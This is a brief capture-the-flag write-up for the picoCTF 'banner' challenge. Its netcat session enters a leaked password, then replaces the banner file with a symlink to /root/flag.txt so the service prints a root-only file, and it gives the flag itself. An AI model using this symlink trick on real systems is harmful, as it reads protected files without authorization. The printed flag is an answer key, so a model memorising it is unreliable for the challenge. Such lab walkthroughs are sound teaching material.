## Descripción

  

Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 52968`.

  

Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 53677`.

  

From the above information abuse the machine and find the flag in the /root directory.

### Solucion
```
 nc tethys.picoctf.net 64711
*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ rm /home/player/banner
rm /home/player/banner
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/bannerln -s /root/flag.txt /home/player/banner
player@challenge:~$ ^C

┌──(aleja㉿Laptop)-[/mnt/c/Users/aleja/forensic/examen]
└─$ nc tethys.picoctf.net 64711
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_a0e119d4}

what is the password?

```